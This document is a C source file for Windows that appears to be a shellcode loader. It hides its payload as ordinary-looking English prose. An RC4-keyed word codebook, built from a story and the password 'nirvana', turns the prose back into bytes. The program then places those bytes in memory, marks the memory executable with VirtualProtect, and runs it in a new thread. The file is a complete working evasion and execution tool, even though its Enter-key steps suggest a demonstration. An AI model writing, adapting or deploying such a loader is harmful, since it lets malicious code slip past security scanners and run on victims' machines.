#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#define MAX_WORD_LEN       64
#define MAX_WORDS          256
#define MAX_SHELLCODE_SIZE 65536
#define MAX_NOISE_WORDS    128

const char* TOKEN_SEP = " \t\n\r,.;:!?()[]{}\"'-";

typedef struct {
    size_t bytes_out;
    int codewords;
    int noise_skipped;
    int empty_skipped;
} DecryptStats;

typedef struct {
    unsigned char S[256];
    int i, j;
} RC4_State;

static void rc4_init(RC4_State* rc4, const unsigned char* key, size_t key_len) {
    for (int i = 0; i < 256; i++) rc4->S[i] = (unsigned char)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + rc4->S[i] + key[i % key_len]) % 256;
        unsigned char t = rc4->S[i];
        rc4->S[i] = rc4->S[j];
        rc4->S[j] = t;
    }
    rc4->i = rc4->j = 0;
}

static unsigned char rc4_byte(RC4_State* rc4) {
    rc4->i = (rc4->i + 1) & 0xFF;
    rc4->j = (rc4->j + rc4->S[rc4->i]) & 0xFF;
    unsigned char t = rc4->S[rc4->i];
    rc4->S[rc4->i] = rc4->S[rc4->j];
    rc4->S[rc4->j] = t;
    return rc4->S[(rc4->S[rc4->i] + rc4->S[rc4->j]) & 0xFF];
}

static char g_words[MAX_WORDS][MAX_WORD_LEN];
static const char* g_byte_to_word[256];
static unsigned char g_shuffled_opcodes[256];
static char g_lookup_words[256][MAX_WORD_LEN];
static unsigned char g_lookup_bytes[256];
static int g_lookup_count = 0;

static const char* natural_words[] = {
    "the", "be", "to", "of", "and", "a", "in", "that", "have", "i", "it", "for", "not", "on", "with", "he",
    "as", "you", "do", "at", "this", "but", "his", "by", "from", "they", "we", "say", "her", "she", "or", "an",
    "will", "my", "one", "all", "would", "there", "their", "what", "so", "up", "out", "if", "about", "who", "get", "which",
    "go", "me", "when", "make", "can", "like", "time", "no", "just", "him", "know", "take", "people", "into", "year", "your",
    "good", "some", "could", "them", "see", "other", "than", "then", "now", "look", "only", "come", "its", "over", "think", "also",
    "back", "after", "use", "two", "how", "our", "work", "first", "well", "way", "even", "new", "want", "because", "any", "these",
    "give", "day", "most", "us", "water", "sun", "moon", "star", "sky", "cloud", "rain", "wind", "snow", "ice", "fire", "earth",
    "tree", "flower", "grass", "leaf", "plant", "bird", "fish", "animal", "cat", "dog", "horse", "cow", "pig", "chicken", "duck", "goose",
    "rabbit", "mouse", "house", "home", "room", "door", "window", "wall", "floor", "ceiling", "roof", "garden", "happy", "sad", "angry", "calm",
    "peace", "love", "hate", "joy", "fear", "hope", "dream", "sleep", "wake", "night", "day", "morning", "evening", "noon", "midnight", "dawn",
    "red", "blue", "green", "yellow", "black", "white", "purple", "orange", "pink", "brown", "big", "small", "large", "tiny", "huge", "little",
    "fast", "slow", "quick", "rapid", "steady", "wild", "tame", "soft", "hard", "hot", "cold", "warm", "cool", "dry", "wet", "clean",
    "dirty", "old", "young", "new", "ancient", "modern", "early", "late", "final", "first", "last", "next", "same", "different", "simple", "complex",
    "easy", "real", "fake", "true", "false", "right", "wrong", "correct", "proper", "public", "private", "open", "closed", "free", "busy",
    "full", "empty", "complete", "total", "whole", "partial", "broken", "fixed", "beautiful", "ugly", "pretty", "lovely", "wonderful", "terrible", "excellent"
};
static const int num_natural_words = (int)(sizeof(natural_words) / sizeof(natural_words[0]));

static const char* connector_candidates[] = {
    "however", "therefore", "although", "whereas", "moreover", "furthermore", "nevertheless",
    "meanwhile", "indeed", "basically", "obviously", "certainly", "probably", "perhaps",
    "specifically", "particularly", "especially", "importantly", "notably", "initially",
    "originally", "previously", "subsequently", "recently", "currently", "eventually",
    "immediately", "indirectly", "similarly", "differently", "otherwise", "anyhow",
    "elsewhere", "everywhere", "somewhere", "anywhere", "nowhere", "likewise",
    "nonetheless", "regardless", "consequently", "accordingly", "alternatively",
    "additionally", "equally", "namely", "chiefly", "mainly", "mostly", "partly"
};
static const int num_connector_candidates = (int)(sizeof(connector_candidates) / sizeof(connector_candidates[0]));

static int word_in_pool(const char* word, int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(g_words[i], word) == 0) return 1;
    }
    return 0;
}

static char* duplicate_string(const char* s) {
    if (!s) return NULL;
    size_t len = strlen(s);
    char* copy = (char*)malloc(len + 1);
    if (copy) strcpy(copy, s);
    return copy;
}

static void clean_alpha_token(const char* token, char* clean, size_t clean_sz) {
    size_t j = 0;
    for (size_t i = 0; token[i] && j + 1 < clean_sz; i++) {
        if (isalpha((unsigned char)token[i]))
            clean[j++] = (char)tolower((unsigned char)token[i]);
    }
    clean[j] = '\0';
}

static int extract_unique_words(const char* sentence) {
    char* copy = duplicate_string(sentence);
    if (!copy) return 0;

    int count = 0;
    char* tok = strtok(copy, TOKEN_SEP);
    while (tok && count < MAX_WORDS) {
        char clean[MAX_WORD_LEN];
        clean_alpha_token(tok, clean, sizeof(clean));
        if (clean[0] != '\0' && !word_in_pool(clean, count)) {
            strcpy(g_words[count], clean);
            count++;
        }
        tok = strtok(NULL, TOKEN_SEP);
    }
    free(copy);
    return count;
}

static void add_natural_padding(int current) {
    int idx = 0;
    for (int i = current; i < MAX_WORDS; i++) {
        char candidate[MAX_WORD_LEN];
        int attempts = 0;
        for (;;) {
            strcpy(candidate, natural_words[idx % num_natural_words]);
            idx++;
            if (!word_in_pool(candidate, i)) break;
            if (++attempts > num_natural_words + 64) {
                snprintf(candidate, sizeof(candidate), "pad%03d", i);
                if (!word_in_pool(candidate, i)) break;
            }
        }
        strcpy(g_words[i], candidate);
    }
}

static void generate_shuffled_opcodes(const char* password) {
    for (int i = 0; i < 256; i++) g_shuffled_opcodes[i] = (unsigned char)i;
    RC4_State rc4;
    rc4_init(&rc4, (const unsigned char*)password, strlen(password));
    for (int i = 255; i > 0; i--) {
        unsigned char ks = rc4_byte(&rc4);
        int j = ks % (i + 1);
        unsigned char t = g_shuffled_opcodes[i];
        g_shuffled_opcodes[i] = g_shuffled_opcodes[j];
        g_shuffled_opcodes[j] = t;
    }
}

static void create_byte_to_word_map(void) {
    for (int i = 0; i < 256; i++) g_byte_to_word[i] = NULL;
    for (int pos = 0; pos < 256; pos++) {
        unsigned char b = g_shuffled_opcodes[pos];
        g_byte_to_word[b] = g_words[pos];
    }
}

static void build_reverse_lookup(void) {
    g_lookup_count = 0;
    for (int pos = 0; pos < 256; pos++) {
        strcpy(g_lookup_words[g_lookup_count], g_words[pos]);
        g_lookup_bytes[g_lookup_count] = g_shuffled_opcodes[pos];
        g_lookup_count++;
    }
}

static int lookup_codeword(const char* word, unsigned char* out_byte) {
    if (!word || !word[0]) return 0;
    for (int i = 0; i < g_lookup_count; i++) {
        if (strcmp(word, g_lookup_words[i]) == 0) {
            *out_byte = g_lookup_bytes[i];
            return 1;
        }
    }
    return 0;
}

static int init_word_mapping(const char* sentence, const char* password) {
    int count = extract_unique_words(sentence);
    if (count <= 0) return 0;
    if (count < MAX_WORDS) add_natural_padding(count);
    if (strlen(password) < 4) return 0;
    generate_shuffled_opcodes(password);
    create_byte_to_word_map();
    build_reverse_lookup();
    return 1;
}

static size_t decrypt_shellcode(const char* text, unsigned char** output, int verbose, DecryptStats* stats) {
    if (!text || !output || !stats) return 0;

    *output = (unsigned char*)malloc(MAX_SHELLCODE_SIZE);
    if (!*output) return 0;
    memset(stats, 0, sizeof(*stats));

    char* copy = duplicate_string(text);
    if (!copy) { free(*output); *output = NULL; return 0; }

    size_t out_pos = 0;
    char* tok = strtok(copy, TOKEN_SEP);

    while (tok) {
        if (out_pos >= MAX_SHELLCODE_SIZE) break;

        char clean[MAX_WORD_LEN];
        clean_alpha_token(tok, clean, sizeof(clean));

        if (clean[0] == '\0') {
            stats->empty_skipped++;
            tok = strtok(NULL, TOKEN_SEP);
            continue;
        }

        unsigned char byte_val;
        if (lookup_codeword(clean, &byte_val)) {
            (*output)[out_pos++] = byte_val;
            stats->codewords++;
            if (verbose && out_pos <= 32)
                printf("  [%3zu] %-20s -> 0x%02X\n", out_pos, clean, byte_val);
        }
        else {
            stats->noise_skipped++;
            if (verbose && stats->noise_skipped <= 20)
                printf("  [noise] %s\n", clean);
        }

        tok = strtok(NULL, TOKEN_SEP);
    }

    stats->bytes_out = out_pos;
    free(copy);
    return out_pos;
}

static int is_printable_text(const unsigned char* data, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        unsigned char c = data[i];
        if (c == '\n' || c == '\r' || c == '\t') continue;
        if (!isprint(c)) return 0;
    }
    return 1;
}

static void wait_for_enter(const char* prompt) {
    if (prompt && prompt[0]) printf("%s", prompt);
    fflush(stdout);
    int ch = getchar();
    if (ch != '\n') {
        while (ch != EOF && ch != '\n') ch = getchar();
    }
}

static const char* secret_sentence =
"The old lighthouse keeper had not seen another human face in over seven years, not since the strange fog rolled in from the sea and never left. "
"Every morning he climbed the spiral staircase with a bucket of oil and a prayer on his lips, polishing the great lens until it shone like a dying star. "
"The birds had stopped coming long ago, and the fish had vanished from the waters below, leaving only silence and the constant moan of waves against broken stone. "
"One night he found a bottle washed up on the rocky shore, sealed with red wax and containing a map drawn on leather. "
"The map showed an island that did not exist, marked with a single word written in faded ink: Eden. "
"He laughed at first, thinking it was a prank or a ghost story, but something in his chest ached with a hope he had buried years ago. "
"So he packed a bag with dried meat, fresh water, a compass that spun in circles, and the old revolver his father had used in the war. "
"He stepped into a rowboat as the sun bled orange and purple across the horizon, pushing off without looking back. "
"The fog swallowed him whole, and for three days he saw nothing but gray mist and his own trembling hands. "
"On the fourth morning he woke to the sound of bells ringing softly in the distance, and the air smelled of honey and rain. "
"Before him stood a forest where the trees had silver leaves and the grass sparkled like broken glass. "
"A path of white stones led into the shadows, and at the end of that path waited something he could not name but had always known. "
"He whispered a prayer to no god in particular, took a deep breath, and stepped forward into the impossible.";

static const char* password = "nirvana";

static const char* ciphertext =
"Laughed hope polishing whispered, do how, nevertheless for bottle partly, nowhere bottle, certainly bottle woke? Initially, spiral woke, ringing fog, mainly spiral who. Hope whole initially horizon purple, hope ink meanwhile fog likewise waited.\n"
"\n"
" Although, hope ink fog, consequently your namely hope moreover ink, moreover fog will, mainly hope. Currently, ink year especially ringing hope, trembling path take, additionally take written, nonetheless whole originally good hope. Whole for vanished all, one he glass other, similarly will!\n"
"\n"
" Woke waves, otherwise good particularly before, mostly woke initially white. Indirectly, waves great ago, especially fog woke spiral hope, likewise ink nonetheless fog. Initially, will ink shore otherwise all hope, probably white regardless birds ink its, partly them initially bottle, accordingly bottle.\n"
"\n"
" Additionally, basically bottle hope never, for meanwhile would these, indirectly hope white, birds anyhow ringing ink hope. Your any originally ink, regardless faded consequently will mist, likewise white birds they, equally who. Obviously, hope this good previously woke, likewise ink leaving, accordingly them hope.\n"
"\n"
" White map written whole, recently good eventually hope, whole for, vanished woke. Immediately, waves good moreover before, mainly woke white, nonetheless waves everywhere come three. Bucket go see, immediately star notably see, dying hands accordingly work.\n"
"\n"
" Meanwhile, when impossible bucket deep, namely word any. Especially, ink faded dying mist white, subsequently birds used, originally woke? Ink revolver, hope any ink, originally faded grass accordingly mist, white birds?\n"
"\n"
" Consequently, woke ink known them, therefore hope white birds, recently woke word, woke initially word. Regardless, him packed namely bag woke, specifically word consequently woke packed woke, although bag hope, polishing father? Partly, will woke fog, this three word namely woke.\n"
"\n"
" Mainly, packed bag hope ink, subsequently then their forest. This, everywhere this, somewhere this years, hope pushing white, otherwise bottle, currently bottle, basically bottle. recently Bottle, mainly bottle, nonetheless bottle, likewise bottle recently hope, certainly another, indeed another white, everywhere white bottle, previously bottle woke.\n"
"\n"
" Accordingly, pushing whole ink, currently we anyhow rolled this perhaps because, eventually people particularly do. Everywhere, constant war who woke, regardless pushing found long nowhere own, saw likewise this, because hope! Subsequently, polishing staircase mostly stones immediately all partly some, immediately he!\n"
"\n"
" Nonetheless, than its namely waters otherwise three bucket, coming people initially my rowboat, otherwise year indirectly we. Something bottle packed, partly woke stone say, elsewhere this because. Leather one orange, leather up purple, partly an purple, bottle.";

int main(void) {
    if (!init_word_mapping(secret_sentence, password)) {
        fprintf(stderr, "Failed to initialize word mapping.\n");
        return EXIT_FAILURE;
    }

    wait_for_enter("Press <Enter> to allocate ciphertext buffer...\n");

    char* ciphertext_buf = (char*)malloc(strlen(ciphertext) + 1);
    if (!ciphertext_buf) {
        fprintf(stderr, "Failed to allocate ciphertext buffer.\n");
        return EXIT_FAILURE;
    }
    strcpy(ciphertext_buf, ciphertext);
    printf("[+] Allocated ciphertext buffer at %p\n", (void*)ciphertext_buf);

    wait_for_enter("Press <Enter> to decrypt payload...\n");

    unsigned char* decoded = NULL;
    DecryptStats stats;
    size_t decoded_len = decrypt_shellcode(ciphertext_buf, &decoded, 0, &stats);
    free(ciphertext_buf);
    ciphertext_buf = NULL;

    if (decoded_len == 0 || decoded == NULL) {
        fprintf(stderr, "Decryption failed or produced no output.\n");
        free(decoded);
        return EXIT_FAILURE;
    }

    printf("[+] Decoded %llu bytes (codewords=%d, noise_skipped=%d).\n\n",
        (unsigned long long)decoded_len, stats.codewords, stats.noise_skipped);

    if (is_printable_text(decoded, decoded_len)) {
        wait_for_enter("Press <Enter> to display decoded text...\n");
        printf("Decoded text:\n%.*s\n", (int)decoded_len, decoded);
        free(decoded);
        return EXIT_SUCCESS;
    }

    wait_for_enter("Press <Enter> to allocate executable memory...\n");

    void* exec_mem = VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        fprintf(stderr, "VirtualAlloc failed: %lu\n", GetLastError());
        free(decoded);
        return EXIT_FAILURE;
    }
    printf("[+] Allocated address at 0x%p of size %zu\n", exec_mem, decoded_len);

    wait_for_enter("Press <Enter> to copy payload into executable memory...\n");
    memcpy(exec_mem, decoded, decoded_len);
    printf("\t[+] Payload copied from decoded buffer to %p\n", exec_mem);

    printf("\t[i] Setting executable permissions... ");
    DWORD old_protect = 0;
    if (!VirtualProtect(exec_mem, decoded_len, PAGE_EXECUTE_READ, &old_protect)) {
        printf("FAILED\n");
        fprintf(stderr, "VirtualProtect failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(decoded);
        return EXIT_FAILURE;
    }
    printf("DONE\n");

    wait_for_enter("Press <Enter> to run the payload...\n");
    printf("\t[i] Running payload at entry 0x%p...\n", exec_mem);

    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (!thread) {
        fprintf(stderr, "CreateThread failed: %lu\n", GetLastError());
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        free(decoded);
        return EXIT_FAILURE;
    }

    printf("[+] Thread created with id: %u\n", GetThreadId(thread));
    WaitForSingleObject(thread, 5000);
    CloseHandle(thread);

    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(decoded);
    return EXIT_SUCCESS;
}
